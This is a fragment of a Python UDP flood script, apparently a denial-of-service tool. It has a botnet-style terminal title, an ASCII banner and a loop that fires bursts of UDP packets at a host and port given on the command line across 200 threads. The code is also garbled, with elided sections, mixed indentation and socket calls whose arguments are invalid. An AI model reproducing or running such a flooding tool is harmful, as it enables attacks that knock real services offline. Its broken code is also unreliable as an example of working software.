...
sys.stdout.write("\x1b]2;Gzaaxyz. | Devices: [1] | Running Attacks [1] | Server Units [8] | Clients: [18]\x07")
host = str(sys.argv[1])
port = int(sys.argv[2])
...
░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░ ▒▒▓  ▒ ░▓  
  ...
  ░░   ░  ░░░ ░ ░ ░  ░  ░   ░ ░  ░  ▒ ░
   ░        ░           ░     ░     ░  
                            ░
                             ╔══════════════════════════╦═══════════════════════╗
\033[95m                IP : [\033[95m{host}\033[95m]
	...
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        pack = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.sendto(str(ip), int(port))
                        pack.sendto(str(ip), int(port))
			addr = (str(ip),int(port))
			for x in range(200):
				s.sendto(data,addr)
                                s.sendto(randomip(), str(ip), int(port))
                                pack.sendto(str(ip), int(port))
                                pack.sendto(str(ip), int(port))
		except:
			s.close()
...
for x in range(200):
   exo = threading.Thread(target=run)
   exo.start()
   exo2 = threading.Thread(target=run2)
   exo2.start()
   time.sleep(.1)
